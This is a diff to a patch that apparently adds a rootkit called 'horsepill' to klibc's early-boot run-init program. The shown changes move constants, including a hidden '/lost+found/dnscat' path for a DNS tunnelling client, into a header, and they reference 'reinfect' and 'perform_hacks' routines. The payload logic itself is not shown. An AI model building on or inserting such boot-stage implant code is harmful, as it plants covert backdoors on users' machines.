@@ -10739,7 +10739,7 @@ Index: klibc-2.0.7/usr/kinit/run-init/horsepill.c
 ===================================================================
 --- /dev/null
 +++ klibc-2.0.7/usr/kinit/run-init/horsepill.c
-@@ -0,0 +1,458 @@
+@@ -0,0 +1,443 @@
 +#include "horsepill.h"
 +
 +#include <sys/mount.h>
@@ -10762,21 +10762,6 @@ Index: klibc-2.0.7/usr/kinit/run-init/horsepill.c
 +
 +#include "dnscat.h"
 +#include "reinfect.h"
-+
-+#define DNSCAT_PATH	"/lost+found/dnscat"
-+
-+#ifndef MS_RELATIME
-+#define MS_RELATIME     (1<<21)
-+#endif
-+#ifndef MS_STRICTATIME
-+#define MS_STRICTATIME  (1<<24)
-+#endif
-+#ifndef CLONE_NEWNS
-+#define CLONE_NEWNS     0x00020000
-+#endif
-+#ifndef CLONE_NEWPID
-+#define CLONE_NEWPID    0x20000000
-+#endif
 +
 +pid_t init_pid;
 +
@@ -11055,7 +11040,7 @@ Index: klibc-2.0.7/usr/kinit/run-init/horsepill.c
 +}
 +
 +/**
-+ * on_sigint - this procedure is handler of SIGINT to send SIGINT to child
++ * sigint_handler - this procedure is handler of SIGINT to send SIGINT to child
 + **/
 +static void sigint_handler()
 +{
@@ -11202,11 +11187,15 @@ Index: klibc-2.0.7/usr/kinit/run-init/horsepill.h
 ===================================================================
 --- /dev/null
 +++ klibc-2.0.7/usr/kinit/run-init/horsepill.h
-@@ -0,0 +1,8 @@
+@@ -0,0 +1,12 @@
 +#ifndef HORSEPILL_H
 +#define HORSEPILL_H
 +
-+
++#define DNSCAT_PATH	"/lost+found/dnscat"
++#define MS_RELATIME     (1<<21)
++#define MS_STRICTATIME  (1<<24)
++#define CLONE_NEWNS     0x00020000
++#define CLONE_NEWPID    0x20000000
 +
 +void perform_hacks();
 +
